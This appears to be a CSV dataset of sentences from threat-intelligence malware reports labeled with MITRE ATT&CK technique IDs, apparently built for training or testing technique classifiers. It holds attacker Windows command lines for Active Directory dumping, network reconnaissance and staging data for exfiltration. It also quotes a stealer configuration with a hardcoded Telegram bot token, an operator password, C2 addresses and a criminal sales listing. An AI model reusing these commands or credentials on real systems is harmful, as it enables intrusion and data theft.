text,label
"""cmd"" /c cd /d C:\MS_DATA\&dsquery * -limit 0 -filter ""cmd"" /c cd /d",T1059.003
"-attr objectSID sAMAccountName displayName mail memberOf >da.back&cd ""cmd"" /c cd /d c:\windows\system32\inetsrv\&query user&cd ""cmd"" /c cd /d",T1059.003
The attackers then check connectivity with both the Internet and specific local machines of interest.,T1059.003
"""cmd"" /c cd /d",T1059.003
"c:\windows\system32\inetsrv\&ping 8.8.8.8 -n 1&cd ""cmd"" /c cd /d",T1059.003
"[IP ADDRESS/HOSTNAME]&cd They also retrieve networking information, like network adapters, specific machines, and network services like Remote Desktop Protocol (RDP).","T1016, T1059.003"
"""cmd"" /c cd /d C:\MS_DATA\&ipconfig",T1059.003
"/all&cd ""cmd"" /c cd /d",T1059.003
"c:\windows\system32\inetsrv\&net use&cd ""cmd"" /c cd /d",T1059.003
"c:\windows\system32\inetsrv\&netstat.exe -nob ""cmd"" /c cd /d c:\windows\system32\inetsrv\&netstat -aon |find ""3389""&cd ""cmd"" /c cd /d C:\MS_DATA\&netstat -aon |find ""[IP ADDRESS]""&cd",T1059.003
The threat actor made use of the native makecab tool to compress information gathered for exfiltration.,T1059.003
"""cmd"" /c cd /d C:\MS_DATA\&makecab da.back d.zip >1.txt&cd For lateral movement, the attackers made use of the PsExec tool and the net use command for accessing shared resources on remote machines.","T1570, T1059.003"
[PASSWORD] /u:[DOMAIN]\[USERNAME] A Penchant for Credential Theft,T1003.001
"In order to steal credentials, the attackers employ custom modified versions of Mimikatz, including an executable named pc.exe.",T1003.001
Mimikatz publicly available code (top); strings from a Mimikatz modification (bottom)The pc.exe executable stages the execution of three other components that ultimately result in stealing credentials from the Local Security Authority Subsystem Service (LSASS) process.,T1003.001
"The execution of pc.exe requires a password supplied by the operator (in this case, P2sSW0rd1234!@#$C), which the operator provides through the key command-line parameter.",T1140
"pc.exe decrypts AddSecurityPackage64.dll and pc.dll using the AES encryption algorithm, providing the operator-provided execution password as an initialization vector.",T1140
pc.exe loads and executes the decrypted AddSecurityPackage64.dllusing reflective image loading.,T1140
This allows mim221 to inspect and extract credentials from the LSASS process.,T1562.001
Disabling Windows event logging in an attempt to evade detection; and Injecting pc.dll into LSASS as a Security Package.,"T1562.001, T1055"
Security Packages are used to extend the Windows authentication mechanism and can be abused to execute malicious code in the context of LSASS.,"T1562.001, T1055"
"In an attempt to remain undetected, AddSecurityPackage64.dll disables Windows event logging by killing threads of the Windows Event Log service without stopping the execution of the service itself.",T1562.001
"This is achieved by locating the process that hosts the Event Log, enumerating the processes’ threads, identifying the threads assigned to the service by their service tag (eventlog), and terminating them.",T1057
Querying service tag informationAddSecurityPackage64.dll injects pc.dll into LSASS by deploying pc.dll as a Security Package.,T1055
"This call instructs LSASS to load and execute pc.dll, which then stages the getHashFlsa64.dll credential theft component.",T1003.001
"getHashFlsa64.dll conducts credential theft in the context of LSASSpc.dll and getHashFlsa64.dll In the context LSASS, pc.dll decrypts, reflectively loads, and executes the code credential theft component getHashFlsa64.dll in a manner similar to pc.exe.",T1140
getHashFlsa64.dll accesses the memory of its host LSASS process and stores stolen credentials in a Mimikatz log file named pc.log for later exfiltration.,T1003.001
"For example, the implementation of AddSecurityPackage64.dll looks like an adaptation of public code that demonstrates injection of a Security Package into LSASS using RPC calls.",T1003.001
"This includes deploying webshells at Microsoft Exchange servers for establishing an initial foothold, following same file naming conventions, using the LG tool and the net, query, and tasklist Windows built-in tools for gathering user and process information, and the PsExec Windows Sysinternals tool and net for lateral movement and exploration, respectively.","T1570, T1057"
"By pivoting on the original filename of mim221’s getHashFlsa64.dll, we observed another sample that steals credentials from LSASS.",T1003.001
"After analyzing the samples, we found four different versions of the malware, all of which rely on an embedded JavaScript Observed Notation (JSON)-based configuration to set parameters before encrypting files.",T1027
"Revix’s JSON-based configuration While some parameters are ignored by the ransomware, these are most important ones that we observed: pk: A 64-byte key nbody: The ransomware note text-encoded in base64 nname: The ransomware note name ext: The extension added to encrypted files After compromising the system, the malicious actors execute it manually on a NAS device to encrypt files and create a ransom note with a unique key per victim.",T1027
"StealthWorker In 2021, security researchers found brute-force attacks launched from the StealthWorker botnet on Synology NAS devices.",T1110
We found multiple samples for this botnet and confirmed that newer versions are capable of brute-forcing and compromising servers running on several products and systems such as WooCommerce and WordPress.,T1110
"Valid credentials found during compromise are then uploaded to the command-and-control (C&C) server, usually at port 5028/TCP. Figure 4.","T1041, T1095, T1078"
"By: Aliakbar Zahravi, Peter Girnus February 09, 2023Read time: ( words) Save to Folio Subscribe We recently found an active campaign that uses a fake employment pretext targeting Eastern Europeans in the cryptocurrency industry to install an information stealer.",T1005
"In this campaign, the suspected Russian threat actors, use several highly obfuscated and underdevelopment custom loaders in order to infect those involved in the cryptocurrency industry with Enigma stealer (detected as TrojanSpy.MSIL.ENGIMASTEALER.YXDBC), which is a modified version of the Stealerium information stealer.",T1027
"In addition to these loaders, the attacker also exploits CVE-2015-2291, an Intel driver vulnerability, to load a malicious driver designed to reduce the token integrity of Microsoft Defender.",T1068
"Stealerium, the original information stealer which serves as the base for Enigma Stealer, is an open-source project written in C# and markets itself as a stealer, clipper, and keylogger with logging capabilities using the Telegram API.","T1005, T1056.001"
"The infection chain starts with a malicious RAR archive — in this instance, contract.rar (SHA256: 658725fb5e75ebbcb03bc46d44f048a0f145367eff66c8a1a9dc84eef777a9cc) — which is distributed to victims via phishing attempts or through social media.","T1027, T1566.001"
"The archive contains the files, Interview questions.txt, and Interview conditions.word.exe.",T1140
This serves to further legitimize the package in the eyes of the victim and draw attention away from the malicious binary. Figure 3.,T1036.005
"This file, which also masquerades as a legitimate word document, is designed to lure unsuspecting victims into executing the loader.","T1204.002, T1036.005"
"The first utilizes Telegram for delivering payloads, sending commands, and receiving the payload heartbeat.","T1095, T1105"
This server registers a newly infected host when Interview conditions.word.exe is executed by the victim.,T1204.002
"Its primary objective is to download, deobfuscate, decompress, and launch the secondary stage payload.","T1105, T1140"
"The malware incorporates multiple tactics to avoid detection and complicate reverse engineering, such as API hashing, string encryption, and irrelevant code.",T1027
"Before delving into the analysis of ""EngimaDownloader_s001,"" let's first examine how the malware decrypts strings and resolves hashed Windows APIs.","T1027, T1140"
EngimaDownloader_s001 API Hashing: API hashing is a technique employed by malware to conceal the utilization of potentially suspicious APIs (functions) from static detection.,T1027
"It involves replacing the human-readable names of functions (such as ""CreateMutexW"") with a hash value, such as 0x0FD43765A.",T1027
"The hash value is then used in the code to call the corresponding API function, rather than using the human-readable name.",T1027
Custom implementation of murmur hash The malware employs dynamic API resolving to conceal its API imports and make static analysis more difficult.,T1027
"This technique involves storing the names or hashes of the APIs needed, then importing them dynamically at runtime.",T1027
The Windows API offers LoadLibrary and GetProcAddress functions to facilitate this.,T1106
"kernel32_RegSetValueExA 0xC2D33DC : ntdll_RtlGetVersion 0xBD5D03A : kernel32_GetNativeSystemInfo 0x10BEDD60 : wininet_CreateMD5SSOHash To resolve the API hash, the malware first passes two arguments to the ""mw_resolveAPI"" function.",T1027
"WinInet.dll userenv.dll psapi.dll netapi32.dll mpr.dll wtsapi32.dll api-ms-win-core-processthreads-l1-1-0.dll ntoskrnl.exe Rpcrt4.dll User32.dll api-ms-win-core-com-l1-1-0.dll Cabinet.dll shell32.dll OleAut32.dll Ole32.dll ntdll.dll mscoree.dll kernel32.dll advapi32.dll The library name and export function name hashed value is then passed to GetExportAddressByHash, which is responsible for opening the handle to the library, creating a hash for each export function name, and comparing it with the passed argument.",T1027
Retrieving the address of an API The code snippet in Figure 11 demonstrates how mw_GetExportAddressByHash resolves the given API hash and retrieves the address of an exported function.,T1027
"Upon execution, the malware creates the mutual exclusion object (mutex) to mark its presence in the system and retrieves the MachineGuid of the infected system from the SOFTWARE\Microsoft\Cryptography\MachineGuid registry key, which it uses as a unique identifier to register the system with its C&C server and track its infection.",T1012
"Constructing a unique system identifier and creating a mutex It then deletes the HKCU\SOFTWARE\Intel registry key and recreates it with two values, HWID and ID, as shown in Figure 13. Figure 13.",T1112
Recreating HKCU\SOFTWARE\Inte It then collects information about the .NET Framework Setup on the infected system and sends it to its C&C server as shown in Figure 14. Figure 14.,T1082
"The first one ,193[.]56[.]146[.]29, is used to send program execution DEBUG and Telegram to deliver payloads and send commands.","T1095, T1105"
"To download the next stage payload, the malware first sends a request to the attacker-controlled Telegram channel https://api[.]telegram[.]org/bot{token}/getFile to obtain the file_path.",T1095
"The code responsible for decrypting the next stage payload file_id and Telegram token If the file's download, deobfuscation, and decompression are successful, the malware sends the message ""bot getted"" to the debug server. Figure 19.","T1095, T1140"
"Successful payload retrieval debug message To decompress the payload, the malware uses Microsoft Cabinet's Compressapi with the compression algorithm (""COMPRESS_RAW | COMPRESS_ALGORITHM_LZMS"").",T1106
"Payload deobfuscation and decompression Before executing the payload, the malware attempts to elevate its privileges by executing the mw_UAC_bypass function, which is part of an open-source project.",T1548.002
"This technique, Calling Local Windows RPC Servers from .NET (which was unveiled in 2019 by Project Zero), allows a user to bypass user account control (UAC) using only two remote procedure call (RPC) requests instead of DLL hijacking.",T1548.002
"Finally, the malware executes an export function called ""Entry"" from UpdateTask.dll via rundll32.exe as shown in Figure 23. Figure 23.",T1218.011
Running the stage 2 payload through rundll32.exe Stage 2: EngimaDownloader_s002 MD5 SHA-1 SHA-256 File size 377f617ccd4aa09287d5221d5d8e1228 288358deaa053b30596100c9841a7d6d1616908d f1623c2f7c00affa3985cf7b9cdf25e39320700fa9d69f9f9426f03054b4b712 497.50 KB (509440 bytes),T1218.011
The primary objective of this malware is to disable Microsoft Defender by deploying a malicious kernel mode driver (“bring your own vulnerable driver” or BYOVD method) via exploiting a vulnerable Intel driver (CVE-2015-2291) and then downloading and executing the third-stage payload.,"T1562.001, T1068"
"Upon execution, the malware creates the mutex to mark its presence on the system and retrieves the MachineGuid of the infected system from the ""SOFTWARE\Microsoft\Cryptography\MachineGuid"" registry key.",T1012
"Constructing a unique system identifier and creating a mutex Next, the malware will determine if it is running as an account with administrator privileges or simply as a regular user using the GetTokenInformation API.","T1033, T1106"
"Stage 2 embedded binary files Name MD5 SHA-1 SHA-256 iQVW64.SYS (CVE-2015-2291) Vulnerable Intel driver, used for kernel exploitation 1898ceda3247213c084f43637ef163b3 d04e5db5b6c848a29732bfd52029001f23c3da75 4429f32db1cc70567919d7d47b844a91cf1329a6cd116f582305f3b7b60cd60b Driver.",T1027
The malware then establishes persistence on the targeted system by creating scheduled tasks. Figure 28.,T1053.005
SYS 28ca7a21de60671f3b528a9e08a44e1c 21F1CFD310633863BABAAFE7E5E892AE311B42F6 D5B4C2C95D9610623E681301869B1643E4E2BF0ADCA42EAC5D4D773B024FA442 The driver's sole purpose is to patch the integrity level of the Microsoft defender (MsMpEng.exe) and forcibly reduce it from system to untrusted integrity.,T1562.001
"It is responsible for downloading, decompressing, and executing the final stealer payload on an infected system.",T1140
"The malware also accepts commands from a Telegram channel, though these commands may vary between variants.",T1095
"stop alive runassembly Upon launch, the malware sends a ""Bot started"" message to both the Debug server and the Telegram channel, indicating its successful execution. Figure 34.",T1095
It then sends a GET request to https://api[.]telegram[.]org/bot{token}/getUpdates to retrieve the command.,T1095
"Upon receiving the runassembly command, the malware downloads the next part of the final stage payload (file_19.pack), decompresses it using the GZipStream API, and executes it.","T1105, T1140"
"Upon execution, the malware initializes configuration and sets up its working directory. Figure 37.",T1074.001
"Engima Stealer initialization The malware configuration is as follows: public static string Version = ""0.05.01""; public static string DebugMode = ""0""; public static string Mutex = ""6C0560CE-2E75-4BB4-A26E-F08592A1D56D""; public static string AntiAnalysis = ""0""; public static string Autorun = ""1""; public static string StartDelay = ""0""; public static string WebcamScreenshot = ""1""; public static string KeyloggerModule = ""0""; public static string ClipperModule = ""0""; public static string GrabberModule = ""0""; public static string TelegramToken = ""5894962737:AAHAFZnz2AkLAyHC0G-7S2je9JMWWLJHGsU""; public static string TelegramChatID = ""5661436914""; It then starts to collect system information and steals user information, tokens, and passwords from various web browsers and applications such as Google Chrome, Microsoft Edge, Microsoft Outlook, Telegram, Signal, OpenVPN and others.","T1078, T1074.001"
It captures screenshots and extracts clipboard content and VPN configurations.,T1113
The collected information is then compressed and exfiltrated to the attacker via Telegram.,T1041
"Enigma Stealer capabilities It's worth mentioning that some strings, such as web browser paths and Geolocation API services URLs, are encrypted with the AES algorithm in cipher-block chaining (CBC) mode.",T1573.001
"This new backdoor gathers basic system information, which it then sends to the C2, and in return receives an AES encrypted payload.","T1041, T1027, T1082"
"Dave Loader loads the resources using the API calls LdrFindResource_U and LdrAccessResource, and decrypts them using XOR and the key mh8ZqMlTsaDYBZe7ma\x00.","T1106, T1140"
"Dave Loader executes the decrypted shellcode and passes the PE payload to it, which the shellcode then loads and executes.","T1055, T1140"
"Upon execution, Domino Backdoor starts by generating a Bot ID for the infected system by gathering the username and hostname and creating a hash of the collected data, to which it then appends its current process id.","T1033, T1005, T1082"
"However, Lizar used a CRC algorithm to create its hash, whereas Domino uses a custom algorithm which XOR’s multiple values together.",T1027
"Interestingly, Lizar used a similar XOR-based algorithm as part of its encryption mechanisms during communication with the C2. Fig 1 — Domino Backdoor system ID generation The malware then proceeds to decrypt its configuration block, which is stored in the data section of the binary.","T1573.001, T1140"
The config is decrypted using XOR and a 16-byte key which is stored immediately before the encrypted config block.,"T1027, T1140"
"Fig 2 — Domino Backdoor config decryption In the analysed sample the decrypted config contains two pipe-delimited IP addresses, 88.119.175[.]124 and 94.158.247[.]72.",T1140
"This is the same format used by Lizar to store its configuration. 00000000 38 38 2e 31 31 39 2e 31 37 35 2e 31 32 34 7c 39 |88.119.175.124|9| 00000010 34 2e 31 35 38 2e 32 34 37 2e 37 32 00 6e ee 99 |4.158.247.72.nî.| 00000020 37 b1 2d 84 e5 8d 6a 70 21 3e d5 21 2c c1 37 b5 |7±-.å.jp!>Õ!,Á7µ| 00000030 1f b7 09 f3 9b 0a c7 fe 53 32 23 6a 8c b0 4e 22 |.·.ó..ÇþS2#j.°N”| Scroll to view full table",T1140
"A second config block, which is decrypted separately, contains an RSA public key.","T1027, T1140"
"The malware generates a random 32-byte key, which it encrypts using the RSA key.",T1027
It then attempts to connect to the C2 via TCP port 443 and send the encrypted key.,T1095
"If the initial connection is successful, the malware then proceeds to gather basic system information, including username, computer name, and OS version, which it then encrypts using AES-256-CBC and the generated, shared key (null bytes used for IV).","T1573.001, T1033, T1082"
"The malware first sends 4 bytes to the C2 that contain a XOR-encrypted value, which is the size of the data to follow, and then sends the AES-encrypted system data.",T1573.001
"The malware then begins a loop of checking in with the C2 by first sending a 4-byte encrypted size, followed by a 16-byte AES-encrypted block, which decrypts to the following 5 bytes {01 00 00 00 ff}.",T1140
The malware then decrypts the received payload using AES and the shared key.,T1140
"The decrypted data consists of a 4 byte size, followed by a single byte indicating either a command or the load method that the malware should use for the payload, followed by the payload data itself, if applicable.",T1140
"If the command byte is 0x7, then the malware enumerates the running processes on the system and compiles a list of process names and IDs.",T1057
This data is then encrypted using AES and returned to the C2.,T1573.001
"0x1 — Copy the payload into allocated memory within the current process and create a new thread to execute an export named ReflectiveLoader within the payload DLL. 0x4 — Save the payload to the %Temp% directory with a filename generated via GetTempFileNameA, and execute the file using CreateProcessA. 0x5, 0x6 — Open process with process id provided with the downloaded data.",T1106
"In addition to having similar coding styles and utilising similar API calls, Domino Backdoor uses the same configuration structure as the Lizar Loader.",T1106
"In both cases, a configuration block containing a pipe-delimited list of IP addresses is decrypted using XOR and a 16-byte key which is stored immediately before the encrypted config.","T1027, T1140"
In the case of Domino Backdoor a hash is generated from the system username and hostname and the process ID is appended.,"T1033, T1082"
The hashing algorithm is custom and appears to be based on an encryption algorithm used previously in the Lizar Loader.,T1027
"For example, the system information gathered by Domino Backdoor and sent to the C2 matches the reported functionality of Lizar’s Info32/Info64.dll plugin.",T1041
"Also, the function within Domino Backdoor to enumerate running processes and send a list of process names and IDs back to the C2 is very similar to the functionality of Lizar’s ListProcesses32/ListProcesses64.dll plugin.","T1041, T1057"
"Once loaded, Domino Loader starts by loading an encrypted payload from its resources and decrypting it using AES-256-CBC and a hardcoded key.","T1027, T1140"
The Microsoft WinCrypt library is used for AES encryption and decryption by both Domino Backdoor and Loader.,"T1027, T1140"
"The decrypted data consists of 4 bytes containing the payload size, followed by a further 4 bytes containing either the entry point offset for the payload or a value indicating the load method which should be used, followed by the payload itself.",T1140
If the value of the load field is -1 then the loader allocates memory within the current process and then loads the PE payload into it using the full PE loading procedure.,T1055
"It copies the headers, maps the individual PE sections, processes any relocations, loads the PE’s imports, and then executes the PE from its internally specified entry point.",T1055
"– Selling together with all sources (build, builder, panel) FUNCTIONALITY : Spoiler: STEALER – Log collection takes place in memory – Collection of data from Chromium browsers (Cookies/CC/Passwords/Autofills/Bookmars/History) v80+ – Collection of data from Gecko browsers (Cookies/Passwords/Bookmark/History) v80+ – Collection of RDP/FTP sessions – Grabbink files from the desktop (by extension) – Collection of UserAgent – Collection of information about the system in HTML format – Collect Vpn (NordVpn/OpenVpn/ProtonVpn) –",T1082
"Electrum,Electrum-Dash,Ethereum,Exodus,Atomic,Jaxx,Coinomi,Guarda,Armory,Zcash,Bytecoin List of supported crypto plugins: TronLink, MetaMask, Binance Chain Wallet Anti-sniffer: All programs that catch http/https data transfer are closed [even if the name is changed] – Self-delete after sending data (on/off) – CIS(Lock start in CIS countries) (on/off) – Blocking startup on virtual machines (on/off) – Sending data to the Web-panel (IP logger is on the side of the panel)","T1071.001, T1070.004"
"Browsers include: “\\Mozilla\\Firefox”, “\\Comodo\\IceDragon”, “\\Mozilla\\SeaMonkey”, “\\Moonchild Productions\\Pale Moon”, “\\Waterfox”, “\\K-Meleon”, “\\Thunderbird”, “\\8pecxstudios\\Cyberfox”, “\\NETGATE Technologies\\BlackHaw” CryptoWallet data from browser extensions MetaMask, TronLink, and Binance Clipboard data The following data collection tasks are then all set to run in parallel. CryptoWallets on disk from apps including: Electrum, Electrum-Dash, Ethereum, Exodus, Atomic, Jaxx, Coinomi, Guarda, Armory, Zcash, Bytecoin System info, including both hardware and OS info.","T1057, T1082"
"Enumerates running processes Enumerates IDs from Steam application Enumerates files under Steam application directory Gets a list of installed browsers by looping through entries under registry key SOFTWARE\\Clients\\StartMenuInternet and SOFTWARE\\WOW6432Node\\Clients\\StartMenuInternet, and then recording the contents of subkey shell\\open\\command for each.","T1083, T1057, T1012"
Enumerate files on desktop Discord Tokens FoxMail data DynDNS credentials FileZilla connection credentials + hosts.,T1083
"Fig 7 — Nemesis waits for data collection tasks to complete, then adds the data to a zip archive to be sent to the C2 Fig 8 — Nemesis uploads data to the C2 via a HTTP POST request The C2 address for the analysed sample is https[:]//es-megadom[.]com Fig 9 — Nemesis Configuration A Tangled Web Provides Opportunities This analysis highlights the intricate relationships between cybercriminal groups and their members.","T1005, T1071.001"
TA0002 Execution;T1106 Native API;BlackCat ransomware uses Native API. ;,T1106
"T1053 Scheduled Task/Job;When deploying ransomware in the victim’s network infrastructure, BlackCat affiliates may exploit group policies, which results in a scheduled task being created (on each host) that launches the ransomware. ;T1059.001 Command and Scripting Interpreter:",T1053.005
"PowerShell;The attackers may use PowerShell scripts when deploying ransomware in the victim’s network, disabling security tools, and encrypting files. ;T1059.003",T1562.001
"Windows Command Shell;For stopping IIS, deleting Volume Shadow Copies, disabling recovery, clearing Windows event logs, etc., the BlackCat ransomware uses the command shell to run appropriate commands.",T1059.003
"Instrumentation;The attackers may use wmic to obtain information and run various commands, including to delete Volume Shadow Copies.",T1047
"They may also use the wmiexec module from Impacket to execute commands and move across the network. ;T1569.002 System Services: Service Execution;The BlackCat ranswomare for Windows can self-propagate in the local area network using the legitimate PsExec utility (contained in its body), which creates a temporary system service.","T1047, T1569.002"
TA0003 Persistence;T1505 Server Software Component;Successfully exploiting ProxyShell vulnerabilities enabled the attackers to place a web shell on a vulnerable Microsoft Exchange server. ;T1078 Valid Accounts;Legitimate accounts obtained by the attackers can be used to ensure persistence in the compromised infrastructure.,T1078
"TA0004 Privilege Escalation;T1078 Valid Accounts;To escalate privileges, BlackCat may use stolen legitimate accounts specified in the configuration data. ;T1548.002 Abuse Elevation Control Mechanism: Bypass User Account Control;To bypass UAC, BlackCat ransomware may escalate privileges using the ICMLuaUtil COM interface, as well as use the Masquerade PEB method. ;T1134.002 Access Token Manipulation: Create Process with Token;To escalate privileges, the BlackCat ransomware can launch its process using stolen authentication data and the function CreateProcessWithLogonW. TA0005 Defense Evasion;T1548.002 Abuse Elevation Control Mechanism: Bypass User Account Control;The attackers may bypass UAC using the ICMLuaUtil COM interface, as well as use the Masquerade PEB method. ;T1140 Deobfuscate/Decode Files or Information;BlackCat decrypts configuration data as well as decrypts and unpacks the legitimate PsExec utility and an additional BAT file contained in the body of the ransomware. ;T1027 Obfuscated Files or Information;BlackCat ransomware uses obfuscation.","T1140, T1548.002, T1106, T1078, T1027, T1059.003"
";T1562.001 Impair Defenses: Disable or Modify Tools;To prevent being detected, the attackers end processes and services related to security and antivirus software. ;T1497 Virtualization/Sandbox Evasion;To counter analysis (including in a sandbox), ALPHV MORPH checks the value of the command line parameter access-token.",T1562.001
"T1036 Masquerading;The attackers use a SoftPerfect Network Scanner executable renamed to svchost.exe. ;T1112 Modify Registry;To propagate, BlackCat uses PsExec to modify the system registry parameter MaxMpxCt to increase the number of failed network requests for each client.","T1112, T1036.005"
"TA0006 Credential Access;T1003.001 OS Credential Dumping: LSASS Memory;To obtain authentication data, the attackers may dump the LSASS process using legitimate tools (procdump, comsvcs.dll).",T1003.001
";T1552 Unsecured Credentials;To obtain authentication data from the registry and files, the attackers may use NirSoft utilities.",T1552.001
";T1087.002 Account Discovery: Domain Account; ;T1482 Domain Trust Discovery;To obtain information about domain trust, the attackers used the ADRecon tool. ;T1046 Network Service Scanning;To scan the target network, the attackers use the open-source utility SoftPerfect Network Scanner. ;T1135 Network Share Discovery;To search for network shares, the attackers use the open-source utility SoftPerfect Network Scanner. ;T1016 System Network Configuration Discovery;For network reconnaissance, the attackers use the open-source utility SoftPerfect Network Scanner. ;T1082 System Information Discovery;BlackCat uses wmic to obtain the UUID of the compromised host.","T1047, T1082"
";T1057 Process Discovery;BlackMatter enumerates all running processes to search for ones relating to security, backups, databases, email systems, office programs, etc. ;T1007 System Service Discovery;BlackCat enumerates system services to search for ones relating to security, backups, and databases. ;T1083 File and Directory Discovery;The attackers enumerate drives, directories, and files to search for sensitive information for exfiltration purposes.","T1005, T1083, T1057, T1518.001"
"Remote Desktop Protocol;The attackers may use RDP to move across the network. ;T1021.002 Remote Services: SMB/Windows Admin Shares;After obtaining privileged authentication data, in order to spread over the local area network and access network resources, the attackers may use the PsExec utility, as well as the psexec, wmiexec and smbexec modules from Impacket. ;T1021.004 Remote Services: SSH;To access parts of the infrastructure running on Linux, the attackers use the PuTTY utility. ;T1570 Lateral Tool Transfer;Moving across the victim’s network and deploying ransomware involves copying related tools to the host.","T1570, T1021.001"
The BlackCat ransomware can self-propagate in the network by using the legitimate PsExec utility contained in its body.,T1570
"TA0009 Collection;T1560.001 Archive Collected Data: Archive via Utility;Before being exfiltrated, data may be put in archives using 7-Zip. ;T1005 Data from Local System;The attackers collect information from the local system for exfiltration purposes. ;T1039",T1005
"Data from Network Shared Drive;The attackers collect information from available network resources for exfiltration purposes. ;T1074 Data Staged;Before exfiltration, the attackers may put collected data in 7Zip archives. ;T1119 Automated collection;The attackers use ExMatter, a tool for automated collection of sensitive information.",T1074.001
"TA0011 Command and Control;T1071 Application Layer Protocol;Remote access tools used by the attackers may use application layer protocols (HTTP, HTTPS, DNS). ;T1105",T1071.001
"Ingress Tool Transfer;After gaining initial access, the attackers copy tools necessary for deployment to the compromised host. ;",T1105
"Protocol Tunneling;To access the compromised system, the attackers may use tunnels built using ngrok or gost. ;T1573 Encrypted Channel;To remotely access the compromised infrastructure, the attackers may use Cobalt Strike, TeamViewer and ScreenConnect, which perform asymmetric/symmetric encryption of the C&C server communication channel. ;","T1573.001, T1219"
"Remote Access Software;To remotely access the compromised infrastructure, the attackers may use the legitimate tools TeamViewer and ScreenConnect.",T1219
"Over C2 Channel;When the attackers use Cobalt Strike, the collected information may be sent via Cobalt Strike server communication channels. ;T1048.002 Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol;The attackers may use the ExMatter exfiltration tool, which sends stolen data to SFTP and WebDav resources specified in the ExMatter configuration. ;T1567.002 Exfiltration Over Web Service: Exfiltration to Cloud Storage;The attackers use the Rclone synchronization utility to upload stolen data to the legitimate cloud storage service MEGA. ;T1020 Automated Exfiltration;After access has been gained, files from target hosts are automatically uploaded to the legitimate cloud storage service MEGA using the Rclone utility.",T1041
"For this reason, in addition to destroying the data, many wipers first destroy two special files in the system: The Master Boot Record (MBR), which is used during the boot process to identify where the Operative System is stored in the disk.",T1082
"Finally, the malware executes a command to delete itself from the system (T1070.004).",T1070.004
"The attackers have been seen using several methods to distribute the wiper through the domain, like: domain Group Policy Object (GPO) (T1484.001), Impacket or SMB (T1021.002) and WMI (T1047) with an additional worm component named HermeticWizard.","T1047, T1484.001"
"The wiper component first installs the payload as a service (T1569.002) under C:\Windows\system32\Drivers\. Afterwards, the service corrupts the first 512 bytes of the MBR of all the Physical Drives, and then enumerates their partitions.","T1083, T1543.003"
"Before attempting to overwrite as much data as the wiper can it will delete key files in the partition, like MFT, $Bitmap, $LogFile, the NTUSER registry hive (T1112) and the event logs (T1070.001).",T1070.004
"Named DoubleZero, the wiper was distributed as a ZIP file containing an obfuscated .NET program.",T1027
"The wiper’s routine sets a hardcoded list of system directories, which are skipped during an initial wiping targeting user files.",T1083
"Afterwards, the skipped system directories are targeted and finally the registry hives: HKEY_LOCAL_MACHINE (containing the hives Sam, Security, Software and System), HKEY_CURRENT_USER and HKEY_USERS.",T1083
Contents Higaisa shortcuts Attribution Crosswalk Loaders and injectors Injectors Local shellcode loaders Attack examples An encrypted resume I can't breathe Chat transcript Attacks on Russian game developers Unity3D Game Developer from St. Petersburg HFS with a surprise A purloined certificate FunnySwitch Unpacking Funny.dll Transport protocols Network-level protocol Application-level protocol Supported commands Unused code FunnySwitch vs. Crosswalk ShadowPad PlugX Paranoid PlugX Conclusion PT products detection names PT Sandbox PT Network Attack Discovery Applications Known names of files from which PL shellcode may be loaded IOCs MITRE 1.,"T1027, T1071.001"
At the core of the attack is an archive named Project link and New copyright policy.rar (75cd8d24030a3160b1f49f1b46257f9d6639433214a10564d432b74cc8c4d020).,T1027
The archive contains a bait PDF document (Zeplin Copyright Policy.pdf) plus the folder All tort's projects - Web lnks with two shortcuts: Conversations - iOS - Swipe Icons - Zeplin.lnk Tokbox icon - Odds and Ends - iOS - Zeplin.lnk The structure of malicious shortcuts resembles the sample 20200308-sitrep-48-covid-19.pdf.lnk spread by the Higaisa group in March 2020.,"T1027, T1036.005"
"Comparing command lines in the covid-19 and Zeplin shortcutsThe mechanism for initial infection is fundamentally the same: trying to open either of the shortcuts leads to running a command that extracts a Base64-encoded CAB archive from the body of the LNK file, after which the archive is unpacked to a temporary folder.","T1140, T1204.002"
Further actions are performed with the help of an extracted JS script.,T1140
"Contents of script 34fDFkfSD32.jsBut here is where the similarity with the sample described in our Higaisa report ends: instead, this script copies the payload to the folder C:\Users\Public\Downloads, achieves persistence by adding itself to the startup folder and adding a scheduler task, and runs the payload.","T1547.001, T1053.005, T1036.005"
The script also sends the output of ipconfig in a POST request to http://zeplin.atwebpages[.]com/inter.php.,T1071.001
The command run by the shortcut also contains the opening of a URL file extracted from the archive.,T1071.001
"On May 30, 2020, a new malicious archive, CV_Colliers.rar (df999d24bde96decdbb65287ca0986db98f73b4ed477e18c3ef100064bceba6d), was detected.",T1027
"In this case, the bait consisted of PDF documents with a CV and IELTS certificate.",T1036.005
